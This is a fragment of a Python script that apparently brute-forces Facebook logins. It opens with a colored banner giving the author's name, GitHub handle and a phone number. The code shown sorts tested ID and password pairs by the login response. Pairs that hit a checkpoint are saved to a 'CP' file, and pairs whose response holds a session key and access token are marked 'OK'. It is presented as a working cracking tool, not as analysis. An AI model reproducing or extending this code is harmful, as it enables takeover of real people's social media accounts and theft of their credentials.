...
┗━━━━━﷽━━━━━┛
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Authur       \x1b[92;1m=>         \x1b[93;1m Marwan AfriDii
\x1b[93;1m Whatsp       \x1b[92;1m=>        \x1b[93;1m +1(754)240-3428
\x1b[93;1m Github       \x1b[92;1m=>         \x1b[93;1m AfriDii
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [AfriDii-CP] %s|%s        '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s [AfriDii -OK] %s|%s        '%(h,idf,pw))
